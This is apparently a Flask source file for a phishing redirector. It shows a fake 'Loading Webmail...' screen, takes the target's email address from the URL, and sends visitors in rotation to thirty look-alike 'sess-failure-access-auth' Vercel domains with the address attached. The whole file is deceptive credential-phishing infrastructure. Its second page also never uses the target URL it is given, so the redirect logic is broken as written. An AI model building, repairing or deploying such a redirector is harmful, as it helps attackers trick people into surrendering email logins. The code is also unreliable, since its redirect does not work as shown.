from flask import Flask, redirect, request, render_template_string
import os

app = Flask(__name__)
application = app

DOMAINS = [
    'https://sess-failure-access-auth.vercel.app',
    'https://sess-failure-access-auth-mu.vercel.app',
    'https://sess-failure-access-auth-nine.vercel.app',
    'https://sess-failure-access-auth-mcw2.vercel.app',
    'https://sess-failure-access-auth-p3gx.vercel.app',
    'https://sess-failure-access-auth-acrv.vercel.app',
    'https://sess-failure-access-auth-mnbx.vercel.app',
    'https://sess-failure-access-auth-32v8.vercel.app',
    'https://sess-failure-access-auth-b7m7.vercel.app',
    'https://sess-failure-access-auth-lmn4.vercel.app',
    'https://sess-failure-access-auth-4gzy.vercel.app',
    'https://sess-failure-access-auth-3ce5.vercel.app',
    'https://sess-failure-access-auth-bb9j.vercel.app',
    'https://sess-failure-access-auth-ttq5.vercel.app',
    'https://sess-failure-access-auth-9tfq.vercel.app',
    'https://sess-failure-access-auth-x1fd.vercel.app',
    'https://sess-failure-access-auth-atu4.vercel.app',
    'https://sess-failure-access-auth-yo3n.vercel.app',
    'https://sess-failure-access-auth-6mvs.vercel.app',
    'https://sess-failure-access-auth-kcgh.vercel.app',
    'https://sess-failure-access-auth-92ek.vercel.app',
    'https://sess-failure-access-auth-6j41.vercel.app',
    'https://sess-failure-access-auth-ca84.vercel.app',
    'https://sess-failure-access-auth-i46e.vercel.app',
    'https://sess-failure-access-auth-f1y3.vercel.app',
    'https://sess-failure-access-auth-7e4d.vercel.app',
    'https://sess-failure-access-auth-jlhd.vercel.app',
    'https://sess-failure-access-auth-njph.vercel.app',
    'https://sess-failure-access-auth-sa27.vercel.app',
    'https://sess-failure-access-auth-nmpw.vercel.app'   
]

# Initialize counter
current_index = 0

@app.route('/')
def round_robin_balancer():
    global current_index
    
    # Try to get email from query parameter first (?web=email@email.com)
    email = request.args.get('web', '')
    
    # If no query parameter, serve a page that can handle the fragment
    if not email:
        return render_template_string('''
            <html>
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #1a1a2e;
            background-image: 
                radial-gradient(circle at 15% 30%, rgba(120, 80, 200, 0.25) 0%, transparent 40%),
                radial-gradient(circle at 85% 70%, rgba(0, 150, 200, 0.2) 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, rgba(40, 20, 80, 0.6) 0%, #0f0f1a 100%);
        }
        .loading-container {
            text-align: center;
            padding: 2.4rem 2.2rem;
            border-radius: 28px;
            background: rgba(0, 0, 0, 0.55);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);
            width: fit-content;
            min-width: 240px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.8s ease-out;
        }
        .loading-container::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 28px;
            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.06) 0%, transparent 60%);
            pointer-events: none;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-6px); }
            to { opacity: 1; transform: translateY(0); }
        }
        /* reusable mail icon with breathing animation */
        .mail-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            animation: breathe 2.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            transform-origin: center;
            will-change: transform, opacity;
        }
        .mail-icon svg {
            width: 54px;
            height: 54px;
            display: block;
            color: #ffffff;
            filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.25));
            transition: filter 0.2s;
        }
        @keyframes breathe {
            0% { transform: scale(0.92); opacity: 0.65; }
            50% { transform: scale(1.12); opacity: 1; }
            100% { transform: scale(0.92); opacity: 0.65; }
        }
        .loading-spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 3px solid rgba(255, 255, 255, 0.12);
            border-top: 3px solid #FF6C2C;
            border-radius: 50%;
            animation: spin 1s ease-in-out infinite;
        }
        .loading-text {
            color: #FF6C2C;
            font-size: 14px;
            letter-spacing: 0.5px;
            opacity: 0.8;
            animation: pulse 1.5s ease-in-out infinite;
            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        @media (max-width: 480px) {
            .loading-container {
                padding: 2rem 1.8rem;
                border-radius: 24px;
            }
            .mail-icon svg {
                width: 46px;
                height: 46px;
            }
            .loading-spinner {
                width: 36px;
                height: 36px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="mail-icon" aria-label="Mail icon" role="img">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
                <rect x="2" y="4" width="20" height="16" rx="3" ry="3" />
                <path d="M2 7 L12 13 L22 7" />
            </svg>
        </div>
        <div class="loading-spinner"></div>
        <div class="loading-text">Loading Webmail...</div>
    </div>
    
    <script>
        const status = document.getElementById('status');

        if (window.location.hash) {
            let email = window.location.hash.substring(1);
            
            // Redirect after 2 seconds
            setTimeout(function() {
                window.location.href = '/?web=' + encodeURIComponent(email);
            }, 2000);
        } else {
            // If no hash, show error after 2 seconds
            setTimeout(function() {
                document.querySelector('.loading-text').innerText = 'Invalid email';
                document.querySelector('.loading-text').style.color = '#dc3545';
            }, 1700);
        }
    </script>
</body>
</html>
        ''')
    
    # Basic email validation
    if not email or '@' not in email or '.' not in email:
        return "Invalid email.", 400
    
    # Get next domain in round-robin sequence
    target_domain = DOMAINS[current_index]
    
    # Increment index for next request
    current_index = (current_index + 1) % len(DOMAINS)
    
    # Construct target URL with the required ?web= parameter format
    target_url = f"{target_domain}/?web={email}"
    
    # Return loading page before redirect
    return render_template_string('''
        <!DOCTYPE html>
<html>
<head>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #1a1a2e;
            background-image: 
                radial-gradient(circle at 15% 30%, rgba(120, 80, 200, 0.25) 0%, transparent 40%),
                radial-gradient(circle at 85% 70%, rgba(0, 150, 200, 0.2) 0%, transparent 45%),
                radial-gradient(circle at 50% 50%, rgba(40, 20, 80, 0.6) 0%, #0f0f1a 100%);
        }
        .loading-container {
            text-align: center;
            padding: 2.4rem 2.2rem;
            border-radius: 28px;
            background: rgba(0, 0, 0, 0.55);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                inset 0 1px 0 rgba(255, 255, 255, 0.08);
            width: fit-content;
            min-width: 240px;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.8s ease-out;
        }
        .loading-container::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 28px;
            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.06) 0%, transparent 60%);
            pointer-events: none;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-6px); }
            to { opacity: 1; transform: translateY(0); }
        }
        /* reusable mail icon with breathing animation */
        .mail-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            animation: breathe 2.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            transform-origin: center;
            will-change: transform, opacity;
        }
        .mail-icon svg {
            width: 54px;
            height: 54px;
            display: block;
            color: #ffffff;
            filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.25));
            transition: filter 0.2s;
        }
        @keyframes breathe {
            0% { transform: scale(0.92); opacity: 0.65; }
            50% { transform: scale(1.12); opacity: 1; }
            100% { transform: scale(0.92); opacity: 0.65; }
        }
        .loading-spinner {
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 3px solid rgba(255, 255, 255, 0.12);
            border-top: 3px solid #FF6C2C;
            border-radius: 50%;
            animation: spin 1s ease-in-out infinite;
        }
        .loading-text {
            color: #FF6C2C;
            font-size: 14px;
            letter-spacing: 0.5px;
            opacity: 0.8;
            animation: pulse 1.5s ease-in-out infinite;
            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        @media (max-width: 480px) {
            .loading-container {
                padding: 2rem 1.8rem;
                border-radius: 24px;
            }
            .mail-icon svg {
                width: 46px;
                height: 46px;
            }
            .loading-spinner {
                width: 36px;
                height: 36px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="mail-icon" aria-label="Mail icon" role="img">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
                <rect x="2" y="4" width="20" height="16" rx="3" ry="3" />
                <path d="M2 7 L12 13 L22 7" />
            </svg>
        </div>
        <div class="loading-spinner"></div>
        <div class="loading-text">Loading Webmail...</div>
    </div>
    
    <script>
        const status = document.getElementById('status');

        if (window.location.hash) {
            let email = window.location.hash.substring(1);
            
            // Redirect after 2 seconds
            setTimeout(function() {
                window.location.href = '/?web=' + encodeURIComponent(email);
            }, 2000);
        } else {
            // If no hash, show error after 2 seconds
            setTimeout(function() {
                document.querySelector('.loading-text').innerText = 'Invalid email';
                document.querySelector('.loading-text').style.color = '#dc3545';
            }, 1700);
        }
    </script>
</body>
</html>
    ''', target_url=target_url)

if __name__ == '__main__':
    app.run(debug=True)
